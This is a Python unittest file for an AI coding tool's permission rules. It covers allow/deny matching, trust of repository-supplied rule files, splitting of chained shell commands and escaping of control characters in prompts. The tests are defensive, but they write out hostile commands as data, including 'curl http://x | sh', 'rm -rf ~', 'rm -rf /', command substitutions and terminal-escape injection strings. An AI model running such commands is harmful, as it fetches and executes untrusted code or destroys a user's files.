"""Permission rules."""

from __future__ import annotations

import io
import json
import pathlib
import shutil
import stat
import sys
import tempfile
import unittest
from unittest import mock

from tests.support import strip_ansi
from wrencode import (
    app,
    permissions,
    ui,
)


class TestPermissions(unittest.TestCase):
    """Rules that approve or refuse without asking, and where they come from."""

    def setUp(self):
        self.tmp = pathlib.Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)
        self.user = self.tmp / "cfg" / "permissions.json"
        self.project = self.tmp / "proj"
        self.project.mkdir()
        self.rules = permissions.Permissions(self.user, self.project)
        self._orig = permissions.ACTIVE
        permissions.ACTIVE = self.rules
        self.addCleanup(setattr, permissions, "ACTIVE", self._orig)

    def test_rule_syntax_and_matching(self):
        self.assertEqual(permissions.parse("bash(git *)"), ("bash", "git *"))
        with self.assertRaises(ValueError):
            permissions.parse("read(x)")
        with self.assertRaises(ValueError):
            permissions.parse("bash()")
        r = permissions.Rule("bash", "git *", "allow", "user")
        self.assertTrue(r.matches("bash", "git status"))
        self.assertFalse(r.matches("bash", "gitk"))
        self.assertFalse(r.matches("edit", "git status"))
        self.assertTrue(
            permissions.Rule("bash", "pytest:*", "allow", "user").matches(
                "bash", "pytest -q tests"
            )
        )
        self.assertTrue(
            permissions.Rule("edit", "src/*", "allow", "user").matches(
                "edit", "src/a/b.py"
            )
        )
        self.assertFalse(
            permissions.Rule("edit", "src/*", "allow", "user").matches(
                "edit", "lib/b.py"
            )
        )
        self.assertTrue(
            permissions.Rule("write", ".env", "deny", "user").matches("write", ".env")
        )

    def test_suggestions(self):
        self.assertEqual(
            permissions.suggest("bash", "npm test -- --watch"), "bash(npm test:*)"
        )
        self.assertEqual(permissions.suggest("bash", "make"), "bash(make)")
        self.assertEqual(permissions.suggest("edit", "src/app/x.py"), "edit(src/app/*)")
        self.assertEqual(permissions.suggest("write", "README.md"), "write(README.md)")

    def test_user_rules_apply_and_deny_wins(self):
        self.rules.add("bash(git *)", "allow", "user")
        self.rules.add("bash(git push *)", "deny", "user")
        self.assertEqual(stat.S_IMODE(self.user.stat().st_mode), 0o600)
        self.assertEqual(str(self.rules.check("bash", "git status")), "bash(git *)")
        self.assertEqual(
            self.rules.check("bash", "git push origin main").effect, "deny"
        )
        self.assertIsNone(self.rules.check("bash", "rm -rf x"))
        self.assertEqual(self.rules.remove("bash(git *)"), 1)
        self.assertIsNone(self.rules.check("bash", "git status"))

    def test_project_allow_rules_need_acceptance_but_deny_rules_do_not(self):
        pf = self.project / permissions.PROJECT_FILE
        pf.parent.mkdir()
        pf.write_text(json.dumps({"allow": ["bash(*)"], "deny": ["write(.env)"]}))
        rules = permissions.Permissions(self.user, self.project)
        self.assertFalse(rules.project_trusted())
        self.assertIsNone(
            rules.check("bash", "anything")
        )  # shipped by the repo: ignored
        self.assertEqual(rules.check("write", ".env").effect, "deny")
        rules.trust_project()
        self.assertTrue(rules.project_trusted())
        self.assertEqual(rules.check("bash", "anything").source, "project")
        pf.write_text(
            json.dumps({"allow": ["bash(*)", "edit(*)"]})
        )  # changed since: ask again
        rules = permissions.Permissions(self.user, self.project)
        self.assertFalse(rules.project_trusted())
        rules.add("edit(docs/*)", "allow", "project")  # the person's own rule...
        self.assertFalse(
            rules.project_trusted()
        )  # ...accepts nothing the repo put there
        self.assertIsNone(rules.check("edit", "docs/a.md"))
        rules.trust_project()
        rules.add("edit(lib/*)", "allow", "project")  # an accepted file stays accepted
        self.assertTrue(rules.project_trusted())
        rules.remove("edit(lib/*)")
        self.assertTrue(rules.project_trusted())
        self.assertEqual(
            json.loads(pf.read_text())["allow"], ["bash(*)", "edit(*)", "edit(docs/*)"]
        )

    def test_bash_rules_apply_to_every_command_of_a_line(self):
        self.assertEqual(
            permissions.commands("git status && curl http://x | sh"),
            ["git status", "curl http://x", "sh"],
        )
        self.assertEqual(
            permissions.commands('git commit -m "a; b" ; echo it\\;s'),
            ['git commit -m "a; b"', "echo it\\;s"],
        )
        self.assertEqual(permissions.commands("a\nb &\nc || d"), ["a", "b", "c", "d"])
        self.assertEqual(permissions.commands("echo $(whoami)"), [])
        self.assertEqual(permissions.commands("echo `id`"), [])
        self.rules.add("bash(git *)", "allow", "user")
        self.rules.add("bash(npm test:*)", "allow", "user")
        self.rules.add("bash(git push:*)", "deny", "user")
        self.assertEqual(str(self.rules.check("bash", "git status")), "bash(git *)")
        self.assertIsNone(self.rules.check("bash", "git status && curl http://x | sh"))
        self.assertIsNone(self.rules.check("bash", "npm test; rm -rf ~"))
        self.assertEqual(
            str(self.rules.check("bash", "git fetch && git rebase main")), "bash(git *)"
        )
        self.assertEqual(
            str(self.rules.check("bash", "git fetch && npm test -- -q")), "bash(git *)"
        )
        self.assertEqual(
            self.rules.check("bash", "git status; git push origin main").effect, "deny"
        )
        self.assertIsNone(self.rules.check("bash", "git log $(cat x)"))  # substitution
        self.assertIsNone(self.rules.check("bash", "npm test-evil"))  # not a word
        self.rules.add("bash(git log $(cat x))", "allow", "user")  # spelled out: fine
        self.assertEqual(self.rules.check("bash", "git log $(cat x)").source, "user")
        self.assertEqual(
            permissions.suggest("bash", "cd x && npm test"), "bash(cd x && npm test)"
        )
        with self.assertRaisesRegex(ValueError, "bash, edit, write, mcp or fetch"):
            permissions.parse("read(x)")

    def test_rules_for_one_project_live_in_the_user_file(self):
        self.rules.add("bash(make)", "allow")  # the default scope: local
        self.assertEqual(self.rules.check("bash", "make").source, "local")
        saved = json.loads(self.user.read_text())
        self.assertEqual(saved["projects"][str(self.project)]["allow"], ["bash(make)"])
        self.assertFalse((self.project / permissions.PROJECT_FILE).exists())
        other = permissions.Permissions(self.user, self.tmp / "elsewhere")
        self.assertIsNone(other.check("bash", "make"))  # not for other projects
        self.assertEqual(self.rules.remove("bash(make)"), 1)
        self.assertIsNone(self.rules.check("bash", "make"))

    def test_confirm_follows_the_rules(self):
        self.rules.add("edit(src/*)", "allow", "user")
        self.rules.add("bash(rm *)", "deny", "user")
        with (
            mock.patch("sys.stdout", io.StringIO()),
            mock.patch.object(ui, "SESSION_AUTO_APPROVE", True),
        ):
            self.assertEqual(ui.confirm("edit", "Apply to src/a.py?", "src/a.py"), "ok")
            denied = ui.confirm("bash", "Run it?", "rm -rf /")
            out = strip_ansi(sys.stdout.getvalue())
        self.assertTrue(
            denied.startswith("cancelled: denied by the permission rule bash(rm *)")
        )
        self.assertIn("✓ edit src/a.py [allowed by rule edit(src/*)]", out)
        self.assertIn("⊘ bash rm -rf / [denied by rule bash(rm *)]", out)

    def test_s_at_the_prompt_saves_a_project_rule(self):
        with (
            mock.patch("builtins.input", return_value="s"),
            mock.patch("sys.stdout", io.StringIO()),
        ):
            self.assertEqual(
                ui._confirm_prompt("Run it?", "bash", "npm test -- -q"), "ok"
            )
            out = strip_ansi(sys.stdout.getvalue())
        self.assertIn("s allow bash(npm test:*)", out)
        self.assertIn("Saved bash(npm test:*) for this project", out)
        self.assertFalse((self.project / permissions.PROJECT_FILE).exists())
        saved = json.loads(self.user.read_text())
        self.assertEqual(
            saved["projects"][str(self.project)]["allow"], ["bash(npm test:*)"]
        )
        self.assertEqual(
            str(self.rules.check("bash", "npm test --watch")), "bash(npm test:*)"
        )

    def test_prompts_show_untrusted_text_escaped(self):
        with (
            mock.patch("builtins.input", return_value="n"),
            mock.patch.object(ui, "read_feedback_line", return_value=""),
            mock.patch("sys.stdout", io.StringIO()),
        ):
            ui._confirm_prompt("Run \x1b[2J it?", "bash", "echo \u202eevil\r\x1b[A")
            out = sys.stdout.getvalue()
        self.assertNotIn("\x1b[2J", out)
        self.assertIn("Run ^[[2J it?", out)
        self.assertIn("s allow bash(echo \\u202eevil:*)", out)
        self.rules.add("bash(rm *)", "deny", "user")
        with mock.patch("sys.stdout", io.StringIO()):
            ui.confirm("bash", "Run?", "rm \x9b1J x")
            out = sys.stdout.getvalue()
        self.assertIn("⊘ bash rm \\x9b1J x [denied", out)

    def test_permissions_command(self):
        with mock.patch("sys.stdout", io.StringIO()):
            app.handle_slash_command("/permissions", [], None)
            app.handle_slash_command("/permissions allow bash(git *) --user", [], None)
            app.handle_slash_command("/permissions deny write(.env)", [], None)
            app.handle_slash_command(
                "/permissions allow bash(make) --project", [], None
            )
            app.handle_slash_command("/permissions", [], None)
            app.handle_slash_command("/permissions forget bash(git *)", [], None)
            app.handle_slash_command("/permissions allow nope", [], None)
            out = strip_ansi(sys.stdout.getvalue())
        self.assertIn("No rules", out)
        self.assertIn("allow  bash(git *)", out)
        self.assertIn("user", out)
        self.assertIn("deny   write(.env)", out)
        self.assertIn("local", out)
        self.assertIn("saved to .wrencode/permissions.json", out)
        self.assertIn("Removed 1 rule", out)
        self.assertIn("not a rule", out)
        self.assertEqual(
            [(str(r), r.source) for r in self.rules.rules()],
            [("write(.env)", "local"), ("bash(make)", "project")],
        )
        # the file held nothing unaccepted before, so the person's own rule keeps it accepted
        self.assertTrue(self.rules.project_trusted())
